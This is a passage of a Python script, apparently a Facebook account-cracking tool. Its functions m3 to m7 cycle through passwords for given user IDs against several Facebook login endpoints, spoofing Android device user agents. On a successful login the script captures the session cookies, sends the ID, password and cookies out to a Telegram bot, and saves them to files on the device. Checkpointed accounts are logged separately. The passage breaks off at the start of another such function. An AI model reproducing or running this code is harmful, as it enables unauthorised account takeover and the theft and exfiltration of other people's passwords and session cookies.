    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M3{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    session=requests.Session()
    ua = ua_valid()
    warna = random.choice(my_color)
    sm2 =("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
    ua3 ="Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(sm2))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
    try:
        for pas in pwv:
            free_fb = session.get('https://free.facebook.com').text
            info={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1), "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number":"0", "unrecognized_tries":"0", "email":ids, "pass":pas, "login":"Log In"}
            update={'User-Agent': "Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+"Mobile Safari/537.36", 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-User': '?1', 'Sec-Fetch-Dest': 'document', 'Cache-Control': 'max-age=0', 'Referer': 'https://www.facebook.com/', 'DNT': '1', 'Pragma': 'no-cache', 'TE': 'Trailers', }
            session.post('https://p.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',data=info,headers=update).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = re.findall('c_user=(.*);xs',coki)[0]
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
                        statusok = (f" {cid} | {pas} | {coki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                if 'y' in cp_xdx:
                        print(f'\r{P} [\033[1;30mZERO-CP.txt{P}] \033[1;30m{uid}|{pas}')
                        open('/sdcard/ZERO-CP.txt','a').write(uid+'|'+pas+'\n')
                        cps.append(uid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(7)
    except Exception as e:
        pass

def m4(ids,pwv):
    global loop,oks,cps
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M4{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    session=requests.Session()
    ua = ua_valid()
    warna = random.choice(my_color)
    HEAD = HEADERSM1
    URSS = URLM1
    DATS = DATAM1
    try:
        for pas in pwv:
            free_fb = session.get('https://free.facebook.com').text
            info={'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': ids,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': pas,'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
            update={
            'User-Agent': "Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+"Mobile Safari/537.36",
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Cache-Control': 'max-age=0',
            'Referer': 'https://lm.facebook.com/',
            'DNT': '1',
            'Pragma': 'no-cache',
            'TE': 'Trailers', }
            session.post('https://mbasic.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',data=info,headers=update).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = re.findall('c_user=(.*);xs',coki)[0]
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
                        statusok = (f" {cid} | {pas} | {coki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                if 'y' in cp_xdx:
                        print(f'\r{P} [\033[1;30mZERO-CP.txt{P}] \033[1;30m{oks.append(cid)}|{pas}')
                        open('/sdcard/ZERO-CP.txt','a').write(uid+'|'+pas+'\n')
                        cps.append(uid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(7)
    except Exception as e:
        pass

def m5(ids,pwv):
    global loop,oks,cps
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M5{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    session=requests.Session()
    ua = ua_valid()
    warna = random.choice(my_color)
    HEAD = HEADERSM1
    URSS = URLM1
    DATS = DATAM1
    try:
        for pas in pwv:
            free_fb = session.get('https://free.facebook.com').text
            info={'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': ids,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': pas,'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
            update={
            'User-Agent': "Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+"Mobile Safari/537.36",
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Cache-Control': 'max-age=0',
            'Referer': 'https://lm.facebook.com/',
            'DNT': '1',
            'Pragma': 'no-cache',
            'TE': 'Trailers', }
            session.post('https://p.facebook.com/login/device-based/login/async/',data=info,headers=update).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = re.findall('c_user=(.*);xs',coki)[0]
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
                        statusok = (f" {cid} | {pas} | {coki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                if 'y' in cp_xdx:
                        print(f'\r{P} [\033[1;30mZERO-CP.txt{P}] \033[1;30m{oks.append(cid)}|{pas}')
                        open('/sdcard/ZERO-CP.txt','a').write(uid+'|'+pas+'\n')
                        cps.append(uid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(7)
    except Exception as e:
        pass

def m6(ids,pwv):
    global loop,oks,cps
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M6{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    session=requests.Session()
    ua = ua_valid()
    warna = random.choice(my_color)
    HEAD = HEADERSM1
    URSS = URLM1
    DATS = DATAM1
    try:
        for pas in pwv:
            free_fb = session.get('https://free.facebook.com').text
            info={'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': ids,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': pas,'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
            update={
            'User-Agent': "Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+"Mobile Safari/537.36",
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Cache-Control': 'max-age=0',
            'Referer': 'https://lm.facebook.com/',
            'DNT': '1',
            'Pragma': 'no-cache',
            'TE': 'Trailers', }
            session.post('https://mobile.facebook.com/login/device-based/login/async/',data=info,headers=update).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = re.findall('c_user=(.*);xs',coki)[0]
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{coki}\33[1;36m");linex()
                        statusok = (f" {cid} | {pas} | {coki} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                if 'y' in cp_xdx:
                        print(f'\r{P} [\033[1;30mZERO-CP.txt{P}] \033[1;30m{oks.append(cid)}|{pas}')
                        open('/sdcard/ZERO-CP.txt','a').write(uid+'|'+pas+'\n')
                        cps.append(uid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(7)
    except Exception as e:
        pass

def m7(ids,pwv):
    global loop,oks,cps
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M7{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    ua = ua_valid()
    warna = random.choice(my_color)
    try:
        for pas in pwv:
            info= {'access_token': "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            'adid': str(uuid.uuid4()),
            'api_key':'882a8490361da98702bf97a021ddc14d',
            'client_country_code': 'US',
            'community_id': '',
            'cpl': 'true',
            'credentials_type': 'password',
            'currently_logged_in_userid': '0',
            'device_id': str(uuid.uuid4()),
            'email': ids,
            'enroll_misauth': 'false',
            'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation',
            'fb_api_req_friendly_name': 'authenticate',
            'format': 'json',
            'generate_analytics_claim': '1',
            'generate_machine_id': '1',
            'generate_session_cookies': '1',
            'jazoest': '2999',
            'locale': 'en_US',
            'meta_inf_fbmeta': 'NO_FILE',
            'password': pas,
            'secure_family_device_id': '',
            'sig': '62f8ce9f74b12f84c123cc23437a4a32',
            'source': 'login',
            'try_num': '1'}
            update={
            'x-fb-connection-quality': 'EXCELLENT',
            'x-fb-connection-type': 'WIFI',
            'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 12; Pixel 3 Build/SP1A.210812.016.C2) [FBAN/Orca-Android;FBAV/412.0.0.15.69;FBPN/com.facebook.orca;FBLC/en_US;FBBV/481775700;FBCR/Verizon;FBMF/Google;FBBD/google;FBDV/Pixel 3;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2028};FBBK/1;FBLR/0;FB_FW/1;]',
            'x-tigon-is-retry': 'False',
            'x-fb-http-engine': 'Liger',
            'x-fb-client-ip': 'True',
            'x-fb-server-cluster': 'True',
            'x-fb-device-group': '7991',
            'x-fb-sim-hni': '311390',
            'x-fb-net-hni': '311390',
            'x-fb-request-analytics-tags': 'unknown',
            'authorization': 'OAuth null',
            'content-type': 'application/x-www-form-urlencoded',
            'x-fb-friendly-name': 'authenticate'}
            url = 'https://b-graph.facebook.com/auth/login'
            q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True).json()
            if 'access_token' in q:
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{coki}"
                cid = str(q['uid'])
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                        print(f'\r\r{rad}[{green}ZERO-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                        print(f"\r\r{green}COOKIES=[🤖]: {warna}{cookie}\33[1;36m");linex()
                        statusok = (f" {cid} | {pas} | {cookie} ")
                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                        open('/sdcard/ZERO-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ZERO-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+cookie+'\n')
                        oks.append(cid)
                        break
            elif 'www.facebook.com' in q['error']['message']:
                if 'y' in cp_xdx:
                        print(f'\r{P} [\033[1;30mZERO-CP.txt{P}] \033[1;30m{oks.append(cid)}|{pas}')
                        open('/sdcard/ZERO-CP.txt','a').write(uid+'|'+pas+'\n')
                        cps.append(uid)
            else:
                continue
            time.sleep(0.01)
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(7)
    except Exception as e:
        pass
xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
def m8(ids,pwv):
    global loop,oks,cps
    uax = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";FBDM/{density=1.875,width=720,height=1465};FBLC/fr_FR;FBRV/427274739;FBCR/Lucky;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A125W;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{green}{animasi}-M8{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[{rad}CP:{len(cps)}{rad}]"),
    sys.stdout.flush()
    ua = useragent_control()
    warna = random.choice(my_color)
    device_id = str(uuid.uuid4())
    adid = str(uuid.uuid4())
    gtt=random.choice(xxxxx)
    try:
        for pas in pwv:
